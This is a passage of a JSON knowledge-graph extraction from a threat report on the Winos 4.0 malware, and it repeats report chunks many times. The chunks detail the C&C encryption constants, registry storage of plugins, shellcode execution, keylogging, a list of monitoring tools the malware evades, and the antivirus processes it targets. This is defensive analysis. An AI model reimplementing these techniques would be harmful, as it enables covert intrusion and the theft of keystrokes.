“04” and a unique 16-byte identifier in UTF-16 format. In some Winos variants, this identifier is the MD5 hash of the DLL module that will be downloaded. Figure 30 is an example of the C&C server response to network traffic.  \nFigure 31 shows a decrypted packet data section.  \nThe stager then sends the next-stage payload plugin, named *登录模块.dll* (*LoginModule.dll*), to the C&C server.  \nFigure 33 shows the decrypted packet data section.  \nThe C&C server response contains the following information:  \n* Module name\n* Module hash\n* Binary loader shellcode\n* DLL module binary file  \nThe stager then saves the decrypted C&C server response (the plugin and its configuration) into the Windows Registry. It uses the name \"d33f351a4aeea5e608853d1a56661059\" and stores it under the key path *HKEY\\_CURRENT\\_USER\\Console\\0* for 32-bit plugins or *HKEY\\_CURRENT\\_USER\\Console\\1* for 64-bit plugins.  \nFinally, to execute the module, the stager locates the shellcode section within the response received from the C&C server at offset 0xA44 and transfers control to the shellcode.",
          "chunk_length": 3095,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos 4.0 stager analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos 4.0 stager analysis"
            ],
            "content_type": "text",
            "token_length": 660,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 29,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "USE",
      "source": "asset--windows-registry",
      "target": "procedure--payload-deployment",
      "confidence": 0.95,
      "evidence": "使用Windows注册表存储payload和配置",
      "chunks_info": [
        {
          "chunk_id": 29,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos 4.0 stager analysis\n\nTo communicate with its C&C server, the malware first needs to generate an encryption key to secure the communication. To generate this key, the malware calls the *timeGetTime()* Windows API function, which returns the system time in milliseconds, and appends “00 00 00 00 ca 00” to it. The data that needs to be transferred is then encrypted with this key and appended after the key.  \nFigure 28 is an example of an initial handshake between the stager and the C&C server. The malware encrypts and sends the hardcoded value “04 00” to its C&C server to indicate that this initial packet contains the key. The server then uses this session key for future communications.  \nThe encryption algorithm begins by preparing a block of data and a key, adjusting the buffer to ensure that there is sufficient space to work with both. The key is then appended to the beginning of the data that needs to be encrypted. The algorithm proceeds with the encryption process, which involves a loop that processes each byte of data. For each byte, a specific byte from the key is selected and transformed by taking its modulus with a hardcoded value (0x1C8) and then adding another hardcoded value (0x36) to it. This transformed key is then used to XOR with the current byte of the data, resulting in the encrypted byte that replaces the original byte in the data. Every ten bytes, the algorithm resets the pointer to the beginning of the key, ensuring that the key is reused cyclically.  \nIt should be noted that, based on our analysis, the value 0x1C8 remained the same in all the samples used in this campaign and several other attacks. However, we have observed that some variants found in the wild use different values, such as 0x7C5, indicating that this value might change from sample to sample. However, the value 0x36 remained the same in all the variants we analyzed.  \nNext, the C&C server responds with a magic value of “04” and a unique 16-byte identifier in UTF-16 format. In some Winos variants, this identifier is the MD5 hash of the DLL module that will be downloaded. Figure 30 is an example of the C&C server response to network traffic.  \nFigure 31 shows a decrypted packet data section.  \nThe stager then sends the next-stage payload plugin, named *登录模块.dll* (*LoginModule.dll*), to the C&C server.  \nFigure 33 shows the decrypted packet data section.  \nThe C&C server response contains the following information:  \n* Module name\n* Module hash\n* Binary loader shellcode\n* DLL module binary file  \nThe stager then saves the decrypted C&C server response (the plugin and its configuration) into the Windows Registry. It uses the name \"d33f351a4aeea5e608853d1a56661059\" and stores it under the key path *HKEY\\_CURRENT\\_USER\\Console\\0* for 32-bit plugins or *HKEY\\_CURRENT\\_USER\\Console\\1* for 64-bit plugins.  \nFinally, to execute the module, the stager locates the shellcode section within the response received from the C&C server at offset 0xA44 and transfers control to the shellcode.",
          "chunk_length": 3095,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos 4.0 stager analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos 4.0 stager analysis"
            ],
            "content_type": "text",
            "token_length": 660,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 29,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "LAUNCH",
      "source": "technique--c2-communication",
      "target": "procedure--shellcode-execution",
      "confidence": 0.95,
      "evidence": "C2通信技术启动shellcode执行过程",
      "chunks_info": [
        {
          "chunk_id": 29,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos 4.0 stager analysis\n\nTo communicate with its C&C server, the malware first needs to generate an encryption key to secure the communication. To generate this key, the malware calls the *timeGetTime()* Windows API function, which returns the system time in milliseconds, and appends “00 00 00 00 ca 00” to it. The data that needs to be transferred is then encrypted with this key and appended after the key.  \nFigure 28 is an example of an initial handshake between the stager and the C&C server. The malware encrypts and sends the hardcoded value “04 00” to its C&C server to indicate that this initial packet contains the key. The server then uses this session key for future communications.  \nThe encryption algorithm begins by preparing a block of data and a key, adjusting the buffer to ensure that there is sufficient space to work with both. The key is then appended to the beginning of the data that needs to be encrypted. The algorithm proceeds with the encryption process, which involves a loop that processes each byte of data. For each byte, a specific byte from the key is selected and transformed by taking its modulus with a hardcoded value (0x1C8) and then adding another hardcoded value (0x36) to it. This transformed key is then used to XOR with the current byte of the data, resulting in the encrypted byte that replaces the original byte in the data. Every ten bytes, the algorithm resets the pointer to the beginning of the key, ensuring that the key is reused cyclically.  \nIt should be noted that, based on our analysis, the value 0x1C8 remained the same in all the samples used in this campaign and several other attacks. However, we have observed that some variants found in the wild use different values, such as 0x7C5, indicating that this value might change from sample to sample. However, the value 0x36 remained the same in all the variants we analyzed.  \nNext, the C&C server responds with a magic value of “04” and a unique 16-byte identifier in UTF-16 format. In some Winos variants, this identifier is the MD5 hash of the DLL module that will be downloaded. Figure 30 is an example of the C&C server response to network traffic.  \nFigure 31 shows a decrypted packet data section.  \nThe stager then sends the next-stage payload plugin, named *登录模块.dll* (*LoginModule.dll*), to the C&C server.  \nFigure 33 shows the decrypted packet data section.  \nThe C&C server response contains the following information:  \n* Module name\n* Module hash\n* Binary loader shellcode\n* DLL module binary file  \nThe stager then saves the decrypted C&C server response (the plugin and its configuration) into the Windows Registry. It uses the name \"d33f351a4aeea5e608853d1a56661059\" and stores it under the key path *HKEY\\_CURRENT\\_USER\\Console\\0* for 32-bit plugins or *HKEY\\_CURRENT\\_USER\\Console\\1* for 64-bit plugins.  \nFinally, to execute the module, the stager locates the shellcode section within the response received from the C&C server at offset 0xA44 and transfers control to the shellcode.",
          "chunk_length": 3095,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos 4.0 stager analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos 4.0 stager analysis"
            ],
            "content_type": "text",
            "token_length": 660,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 29,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "BELONG",
      "source": "report--great-wall",
      "target": "tool--loginmodule-dll",
      "confidence": 0.95,
      "evidence": "报告分析了登录模块.dll的功能",
      "chunks_info": [
        {
          "chunk_id": 31,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\nThe *登录模块.dll* (*LoginModule.dll*) is a fundamental component of Winos 4.0, serving as the core plugin manager for the system. This module is responsible for handling every action and command executed by the operator, which are transmitted via the C&C server as DLL plugins. These plugins extend the functionality of the implant.  \nUpon receiving the response from the C&C server, the implant stores these DLL plugins in the Windows registry paths *HKEY\\_CURRENT\\_USER\\Console\\0* for 32-bit systems or *HKEY\\_CURRENT\\_USER\\Console\\1* for 64-bit systems. Subsequently, the implant loads and uses these plugins to perform various tasks, enhancing its operational capabilities. This modular approach allows for a highly flexible and extensible framework, enabling the efficient execution of diverse functions as required by the operator.  \nOnce the *登录模块.dll* (*LoginModule.dll*) plugin is downloaded, the execution of this module is based on the previously mentioned configuration. The malware creates a thread to collect clipboard data and keystrokes. It also employs a specific mutex for this thread, which is named 测试备注 (*Test Notes*).  \nNext, the malware chooses one of the three available C&C configurations. Before initiating the socket, it checks whether the antianalysis feature is configured to run. If this feature is configured, the malware verifies the presence of monitoring software by inspecting the window titles of running processes. If such software is detected, the malware enters sleep mode.  \nBelow is a list of monitoring software that the malware detects:  \n* 流量（Flow）\n* TaskExplorer\n* Wireshark\n* Fiddler\n* Process\n* ApateDNS\n* CurrPorts\n* 任务管理器（Task manager）\n* 火绒（Tinder）\n* 提示符（Prompt）\n* Malwarebytes\n* Port\n* 资源监视器（Resource monitor）\n* Capsa\n* TCPEye\n* Metascan\n* 网络分析（Network analysis）\n* Sniff  \nThe malware collects system information from an infected machine, including the IP address, computer name, antivirus software, operating system details, and hardware ID (HWID).  \nTable 6 shows a list of targeted antivirus (AV) software.",
          "chunk_length": 2164,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "text",
            "token_length": 485,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 31,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "USE",
      "source": "procedure--plugin-management",
      "target": "tool--loginmodule-dll",
      "confidence": 0.95,
      "evidence": "登录模块.dll用于管理插件",
      "chunks_info": [
        {
          "chunk_id": 31,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\nThe *登录模块.dll* (*LoginModule.dll*) is a fundamental component of Winos 4.0, serving as the core plugin manager for the system. This module is responsible for handling every action and command executed by the operator, which are transmitted via the C&C server as DLL plugins. These plugins extend the functionality of the implant.  \nUpon receiving the response from the C&C server, the implant stores these DLL plugins in the Windows registry paths *HKEY\\_CURRENT\\_USER\\Console\\0* for 32-bit systems or *HKEY\\_CURRENT\\_USER\\Console\\1* for 64-bit systems. Subsequently, the implant loads and uses these plugins to perform various tasks, enhancing its operational capabilities. This modular approach allows for a highly flexible and extensible framework, enabling the efficient execution of diverse functions as required by the operator.  \nOnce the *登录模块.dll* (*LoginModule.dll*) plugin is downloaded, the execution of this module is based on the previously mentioned configuration. The malware creates a thread to collect clipboard data and keystrokes. It also employs a specific mutex for this thread, which is named 测试备注 (*Test Notes*).  \nNext, the malware chooses one of the three available C&C configurations. Before initiating the socket, it checks whether the antianalysis feature is configured to run. If this feature is configured, the malware verifies the presence of monitoring software by inspecting the window titles of running processes. If such software is detected, the malware enters sleep mode.  \nBelow is a list of monitoring software that the malware detects:  \n* 流量（Flow）\n* TaskExplorer\n* Wireshark\n* Fiddler\n* Process\n* ApateDNS\n* CurrPorts\n* 任务管理器（Task manager）\n* 火绒（Tinder）\n* 提示符（Prompt）\n* Malwarebytes\n* Port\n* 资源监视器（Resource monitor）\n* Capsa\n* TCPEye\n* Metascan\n* 网络分析（Network analysis）\n* Sniff  \nThe malware collects system information from an infected machine, including the IP address, computer name, antivirus software, operating system details, and hardware ID (HWID).  \nTable 6 shows a list of targeted antivirus (AV) software.",
          "chunk_length": 2164,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "text",
            "token_length": 485,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 31,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "USE",
      "source": "procedure--plugin-management",
      "target": "asset--registry-path",
      "confidence": 0.95,
      "evidence": "插件存储在Windows注册表路径中",
      "chunks_info": [
        {
          "chunk_id": 31,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\nThe *登录模块.dll* (*LoginModule.dll*) is a fundamental component of Winos 4.0, serving as the core plugin manager for the system. This module is responsible for handling every action and command executed by the operator, which are transmitted via the C&C server as DLL plugins. These plugins extend the functionality of the implant.  \nUpon receiving the response from the C&C server, the implant stores these DLL plugins in the Windows registry paths *HKEY\\_CURRENT\\_USER\\Console\\0* for 32-bit systems or *HKEY\\_CURRENT\\_USER\\Console\\1* for 64-bit systems. Subsequently, the implant loads and uses these plugins to perform various tasks, enhancing its operational capabilities. This modular approach allows for a highly flexible and extensible framework, enabling the efficient execution of diverse functions as required by the operator.  \nOnce the *登录模块.dll* (*LoginModule.dll*) plugin is downloaded, the execution of this module is based on the previously mentioned configuration. The malware creates a thread to collect clipboard data and keystrokes. It also employs a specific mutex for this thread, which is named 测试备注 (*Test Notes*).  \nNext, the malware chooses one of the three available C&C configurations. Before initiating the socket, it checks whether the antianalysis feature is configured to run. If this feature is configured, the malware verifies the presence of monitoring software by inspecting the window titles of running processes. If such software is detected, the malware enters sleep mode.  \nBelow is a list of monitoring software that the malware detects:  \n* 流量（Flow）\n* TaskExplorer\n* Wireshark\n* Fiddler\n* Process\n* ApateDNS\n* CurrPorts\n* 任务管理器（Task manager）\n* 火绒（Tinder）\n* 提示符（Prompt）\n* Malwarebytes\n* Port\n* 资源监视器（Resource monitor）\n* Capsa\n* TCPEye\n* Metascan\n* 网络分析（Network analysis）\n* Sniff  \nThe malware collects system information from an infected machine, including the IP address, computer name, antivirus software, operating system details, and hardware ID (HWID).  \nTable 6 shows a list of targeted antivirus (AV) software.",
          "chunk_length": 2164,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "text",
            "token_length": 485,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 31,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "USE",
      "source": "procedure--data-collection",
      "target": "tool--loginmodule-dll",
      "confidence": 0.95,
      "evidence": "登录模块.dll创建线程收集数据",
      "chunks_info": [
        {
          "chunk_id": 31,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\nThe *登录模块.dll* (*LoginModule.dll*) is a fundamental component of Winos 4.0, serving as the core plugin manager for the system. This module is responsible for handling every action and command executed by the operator, which are transmitted via the C&C server as DLL plugins. These plugins extend the functionality of the implant.  \nUpon receiving the response from the C&C server, the implant stores these DLL plugins in the Windows registry paths *HKEY\\_CURRENT\\_USER\\Console\\0* for 32-bit systems or *HKEY\\_CURRENT\\_USER\\Console\\1* for 64-bit systems. Subsequently, the implant loads and uses these plugins to perform various tasks, enhancing its operational capabilities. This modular approach allows for a highly flexible and extensible framework, enabling the efficient execution of diverse functions as required by the operator.  \nOnce the *登录模块.dll* (*LoginModule.dll*) plugin is downloaded, the execution of this module is based on the previously mentioned configuration. The malware creates a thread to collect clipboard data and keystrokes. It also employs a specific mutex for this thread, which is named 测试备注 (*Test Notes*).  \nNext, the malware chooses one of the three available C&C configurations. Before initiating the socket, it checks whether the antianalysis feature is configured to run. If this feature is configured, the malware verifies the presence of monitoring software by inspecting the window titles of running processes. If such software is detected, the malware enters sleep mode.  \nBelow is a list of monitoring software that the malware detects:  \n* 流量（Flow）\n* TaskExplorer\n* Wireshark\n* Fiddler\n* Process\n* ApateDNS\n* CurrPorts\n* 任务管理器（Task manager）\n* 火绒（Tinder）\n* 提示符（Prompt）\n* Malwarebytes\n* Port\n* 资源监视器（Resource monitor）\n* Capsa\n* TCPEye\n* Metascan\n* 网络分析（Network analysis）\n* Sniff  \nThe malware collects system information from an infected machine, including the IP address, computer name, antivirus software, operating system details, and hardware ID (HWID).  \nTable 6 shows a list of targeted antivirus (AV) software.",
          "chunk_length": 2164,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "text",
            "token_length": 485,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 31,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "USE",
      "source": "tool--antianalysis-feature",
      "target": "target--monitoring-software",
      "confidence": 0.95,
      "evidence": "反分析功能检测监控软件",
      "chunks_info": [
        {
          "chunk_id": 31,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\nThe *登录模块.dll* (*LoginModule.dll*) is a fundamental component of Winos 4.0, serving as the core plugin manager for the system. This module is responsible for handling every action and command executed by the operator, which are transmitted via the C&C server as DLL plugins. These plugins extend the functionality of the implant.  \nUpon receiving the response from the C&C server, the implant stores these DLL plugins in the Windows registry paths *HKEY\\_CURRENT\\_USER\\Console\\0* for 32-bit systems or *HKEY\\_CURRENT\\_USER\\Console\\1* for 64-bit systems. Subsequently, the implant loads and uses these plugins to perform various tasks, enhancing its operational capabilities. This modular approach allows for a highly flexible and extensible framework, enabling the efficient execution of diverse functions as required by the operator.  \nOnce the *登录模块.dll* (*LoginModule.dll*) plugin is downloaded, the execution of this module is based on the previously mentioned configuration. The malware creates a thread to collect clipboard data and keystrokes. It also employs a specific mutex for this thread, which is named 测试备注 (*Test Notes*).  \nNext, the malware chooses one of the three available C&C configurations. Before initiating the socket, it checks whether the antianalysis feature is configured to run. If this feature is configured, the malware verifies the presence of monitoring software by inspecting the window titles of running processes. If such software is detected, the malware enters sleep mode.  \nBelow is a list of monitoring software that the malware detects:  \n* 流量（Flow）\n* TaskExplorer\n* Wireshark\n* Fiddler\n* Process\n* ApateDNS\n* CurrPorts\n* 任务管理器（Task manager）\n* 火绒（Tinder）\n* 提示符（Prompt）\n* Malwarebytes\n* Port\n* 资源监视器（Resource monitor）\n* Capsa\n* TCPEye\n* Metascan\n* 网络分析（Network analysis）\n* Sniff  \nThe malware collects system information from an infected machine, including the IP address, computer name, antivirus software, operating system details, and hardware ID (HWID).  \nTable 6 shows a list of targeted antivirus (AV) software.",
          "chunk_length": 2164,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "text",
            "token_length": 485,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 31,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "USE",
      "source": "procedure--system-info-collection",
      "target": "target--antivirus-software",
      "confidence": 0.95,
      "evidence": "系统信息收集过程针对杀毒软件",
      "chunks_info": [
        {
          "chunk_id": 31,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\nThe *登录模块.dll* (*LoginModule.dll*) is a fundamental component of Winos 4.0, serving as the core plugin manager for the system. This module is responsible for handling every action and command executed by the operator, which are transmitted via the C&C server as DLL plugins. These plugins extend the functionality of the implant.  \nUpon receiving the response from the C&C server, the implant stores these DLL plugins in the Windows registry paths *HKEY\\_CURRENT\\_USER\\Console\\0* for 32-bit systems or *HKEY\\_CURRENT\\_USER\\Console\\1* for 64-bit systems. Subsequently, the implant loads and uses these plugins to perform various tasks, enhancing its operational capabilities. This modular approach allows for a highly flexible and extensible framework, enabling the efficient execution of diverse functions as required by the operator.  \nOnce the *登录模块.dll* (*LoginModule.dll*) plugin is downloaded, the execution of this module is based on the previously mentioned configuration. The malware creates a thread to collect clipboard data and keystrokes. It also employs a specific mutex for this thread, which is named 测试备注 (*Test Notes*).  \nNext, the malware chooses one of the three available C&C configurations. Before initiating the socket, it checks whether the antianalysis feature is configured to run. If this feature is configured, the malware verifies the presence of monitoring software by inspecting the window titles of running processes. If such software is detected, the malware enters sleep mode.  \nBelow is a list of monitoring software that the malware detects:  \n* 流量（Flow）\n* TaskExplorer\n* Wireshark\n* Fiddler\n* Process\n* ApateDNS\n* CurrPorts\n* 任务管理器（Task manager）\n* 火绒（Tinder）\n* 提示符（Prompt）\n* Malwarebytes\n* Port\n* 资源监视器（Resource monitor）\n* Capsa\n* TCPEye\n* Metascan\n* 网络分析（Network analysis）\n* Sniff  \nThe malware collects system information from an infected machine, including the IP address, computer name, antivirus software, operating system details, and hardware ID (HWID).  \nTable 6 shows a list of targeted antivirus (AV) software.",
          "chunk_length": 2164,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "text",
            "token_length": 485,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 31,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "BELONG",
      "source": "report--great-wall",
      "target": "tool--360-total-security",
      "confidence": 0.95,
      "evidence": "报告中提到了360 Total Security",
      "chunks_info": [
        {
          "chunk_id": 32,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\n| --- | --- |\n| **AV vendor** | **Targeted AV process** |\n| 360 Total Security | 360Safe.exe | 360Tray.exe | 360tray.exe | ZhuDongFangYu.exe | 360sd.exe |\n| 金山（Jinshan） | Kxetray.exe | KSafeTray.exe | kscan.exe | kwsprotect64.exe | kxescore.exe |\n| QQ | QQPCRTP.exe | QMDL.exe | QMPersonalCenter.exe | QQPCPatch.exe | QQPCRealTimeSpeedup.exe | QQPCTray.exe | QQRepair.exe |\n| Baidu | BaiduSd.exe | baiduSafeTray.exe |\n| 江民（Jiang Min） | KvMonXP.exe | RavMonD.exe |\n| QuickHeal | QUHLPSVC.EXE |\n| Microsoft MSE | mssecess.exe |\n| Comodo | cfp.exe |\n| DR.WEB | SPIDer.exe |\n| Outpost | acs.exe |\n| 安博士V3 （Dr. An V3） | V3Svc.exe |\n| 韩国胶囊（Korean capsules） | AYAgent.aye |\n| AVG | avgwdsvc.exe |\n| F-Secure | f-secure.exe |\n| 卡巴（Kaba） | avp.exe |\n|  | avpui.exe |\n| McAfee | Mcshield.exe |\n| NOD32 | egui.exe |\n| 可牛（Ke Niu） | knsdtray.exe |\n| Trend Micro | TMBMSRV.exe |\n| 小红伞（Red Umbrella） | avcenter.exe |\n| Norton | rtvscan.exe |\n| Avast | ashDisp.exe |\n| Panda Antivirus Titanium | remupd.exe |\n| BitDefender | vsserv.exe |\n| PSafe | PSafeSysTray.exe |\n| Ad-watch | ad-watch.exe |\n| K7 | K7TSecurity.exe |\n| UnThreat | UnThreat.exe |",
          "chunk_length": 1239,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "table",
            "token_length": 434,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 32,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "APPLY",
      "source": "tool--360-total-security",
      "target": "tool--360safe-exe",
      "confidence": 0.95,
      "evidence": "360 Total Security使用360Safe.exe进程",
      "chunks_info": [
        {
          "chunk_id": 32,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\n| --- | --- |\n| **AV vendor** | **Targeted AV process** |\n| 360 Total Security | 360Safe.exe | 360Tray.exe | 360tray.exe | ZhuDongFangYu.exe | 360sd.exe |\n| 金山（Jinshan） | Kxetray.exe | KSafeTray.exe | kscan.exe | kwsprotect64.exe | kxescore.exe |\n| QQ | QQPCRTP.exe | QMDL.exe | QMPersonalCenter.exe | QQPCPatch.exe | QQPCRealTimeSpeedup.exe | QQPCTray.exe | QQRepair.exe |\n| Baidu | BaiduSd.exe | baiduSafeTray.exe |\n| 江民（Jiang Min） | KvMonXP.exe | RavMonD.exe |\n| QuickHeal | QUHLPSVC.EXE |\n| Microsoft MSE | mssecess.exe |\n| Comodo | cfp.exe |\n| DR.WEB | SPIDer.exe |\n| Outpost | acs.exe |\n| 安博士V3 （Dr. An V3） | V3Svc.exe |\n| 韩国胶囊（Korean capsules） | AYAgent.aye |\n| AVG | avgwdsvc.exe |\n| F-Secure | f-secure.exe |\n| 卡巴（Kaba） | avp.exe |\n|  | avpui.exe |\n| McAfee | Mcshield.exe |\n| NOD32 | egui.exe |\n| 可牛（Ke Niu） | knsdtray.exe |\n| Trend Micro | TMBMSRV.exe |\n| 小红伞（Red Umbrella） | avcenter.exe |\n| Norton | rtvscan.exe |\n| Avast | ashDisp.exe |\n| Panda Antivirus Titanium | remupd.exe |\n| BitDefender | vsserv.exe |\n| PSafe | PSafeSysTray.exe |\n| Ad-watch | ad-watch.exe |\n| K7 | K7TSecurity.exe |\n| UnThreat | UnThreat.exe |",
          "chunk_length": 1239,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "table",
            "token_length": 434,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 32,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "APPLY",
      "source": "tool--360-total-security",
      "target": "tool--360tray-exe",
      "confidence": 0.95,
      "evidence": "360 Total Security使用360Tray.exe进程",
      "chunks_info": [
        {
          "chunk_id": 32,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\n| --- | --- |\n| **AV vendor** | **Targeted AV process** |\n| 360 Total Security | 360Safe.exe | 360Tray.exe | 360tray.exe | ZhuDongFangYu.exe | 360sd.exe |\n| 金山（Jinshan） | Kxetray.exe | KSafeTray.exe | kscan.exe | kwsprotect64.exe | kxescore.exe |\n| QQ | QQPCRTP.exe | QMDL.exe | QMPersonalCenter.exe | QQPCPatch.exe | QQPCRealTimeSpeedup.exe | QQPCTray.exe | QQRepair.exe |\n| Baidu | BaiduSd.exe | baiduSafeTray.exe |\n| 江民（Jiang Min） | KvMonXP.exe | RavMonD.exe |\n| QuickHeal | QUHLPSVC.EXE |\n| Microsoft MSE | mssecess.exe |\n| Comodo | cfp.exe |\n| DR.WEB | SPIDer.exe |\n| Outpost | acs.exe |\n| 安博士V3 （Dr. An V3） | V3Svc.exe |\n| 韩国胶囊（Korean capsules） | AYAgent.aye |\n| AVG | avgwdsvc.exe |\n| F-Secure | f-secure.exe |\n| 卡巴（Kaba） | avp.exe |\n|  | avpui.exe |\n| McAfee | Mcshield.exe |\n| NOD32 | egui.exe |\n| 可牛（Ke Niu） | knsdtray.exe |\n| Trend Micro | TMBMSRV.exe |\n| 小红伞（Red Umbrella） | avcenter.exe |\n| Norton | rtvscan.exe |\n| Avast | ashDisp.exe |\n| Panda Antivirus Titanium | remupd.exe |\n| BitDefender | vsserv.exe |\n| PSafe | PSafeSysTray.exe |\n| Ad-watch | ad-watch.exe |\n| K7 | K7TSecurity.exe |\n| UnThreat | UnThreat.exe |",
          "chunk_length": 1239,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "table",
            "token_length": 434,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 32,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "APPLY",
      "source": "tool--360-total-security",
      "target": "tool--zhudongfangyu-exe",
      "confidence": 0.95,
      "evidence": "360 Total Security使用ZhuDongFangYu.exe进程",
      "chunks_info": [
        {
          "chunk_id": 32,
          "chunk_type": "table",
